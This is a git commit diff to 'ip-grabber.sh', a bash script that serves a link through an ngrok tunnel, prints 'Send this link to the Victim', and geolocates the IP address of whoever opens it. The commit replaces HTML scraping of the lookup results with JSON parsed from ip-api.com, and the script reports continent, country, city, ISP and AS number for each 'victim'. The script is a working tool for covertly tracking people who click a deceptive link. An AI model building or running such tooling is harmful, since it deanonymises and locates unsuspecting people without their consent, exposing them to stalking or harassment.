48f2d5561e97a842916a7230c17f5499d6d0fe1b
Himan10 <h3c.initiative46@gmail.com>
2023-06-25 00:31:35 +0530

    replaced the url with API, and regex pattern changes

--- ip-grabber.sh
+++ ip-grabber.sh
@@ -82,70 +82,70 @@ rm -rf iptracker.log
 fi
 
 IFS='\n'
-iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+# send a get request to an API for IP related information
+# and save the information in ./iptracker.log
+curl -s http://ip-api.com/json/$ip?fields=status,continent,query,reverse,country,regionName,city,isp,currency,as | json_pp > ./iptracker.log
+printf "\n"
+
 IFS=$'\n'
-continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
-printf "\n"
-hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
-if [[ $hostnameip != "" ]]; then
-printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
-fi
-##
+status=$(jq -r .status ./iptracker.log | tr [:upper:] [:lower:])
+if [[ $status == "success" ]]; then
+    continent=$(jq -r .continent ./iptracker.log)
+    if [[ $continent != "" ]]; then
+        printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
+    fi
+    ##
 
-reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
-if [[ $reverse_dns != "" ]]; then
-printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
-fi
-##
+    hostnameip=$(jq -r .query ./iptracker.log)
+    if [[ $hostnameip != "" ]]; then
+        printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+    fi
+    ##
 
+    reverse_dns=$(jq -r .reverse ./iptracker.log)
+    if [[ $reverse_dns != "" ]]; then
+        printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+    fi
+    ##
 
-if [[ $continent != "" ]]; then
-printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
-fi
-##
+    country=$(jq -r .country ./iptracker.log)
+    if [[ $country != "" ]]; then
+        printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+    fi
+    ##
 
-country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
-fi
-##
+    state=$(jq -r .regionName ./iptracker.log)
+    if [[ $state != "" ]]; then
+        printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
+    fi
+    ##
 
-state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-if [[ $state != "" ]]; then
-printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
-fi
-##
-city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    city=$(jq -r .city ./iptracker.log)
+    if [[ $city != "" ]]; then
+        printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+    fi
+    ##
 
-if [[ $city != "" ]]; then
-printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
-fi
-##
+    isp=$(jq -r .isp ./iptracker.log)
+    if [[ $isp != "" ]]; then
+        printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+    fi
+    ##
 
-isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $isp != "" ]]; then
-printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
-fi
-##
+    as_number=$(jq -r .as ./iptracker.log)
+    if [[ $as_number != "" ]]; then
+        printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+    fi
+    ##
 
-as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $as_number != "" ]]; then
-printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+    ip_currency=$(jq -r .currency ./iptracker.log)
+    if [[ $ip_currency != "" ]]; then
+        printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+    fi
+    ##
+    
+    printf "\n"
 fi
-##
-
-ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $ip_speed != "" ]]; then
-printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
-fi
-##
-ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-
-if [[ $ip_currency != "" ]]; then
-printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
-fi
-##
-printf "\n"
 rm -rf iptracker.log
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting till the next victim to open the link send to another person, Press Ctrl + C to exit...\e[0m\n"
 
@@ -247,7 +247,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Po "https://[\w\-\.]+")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
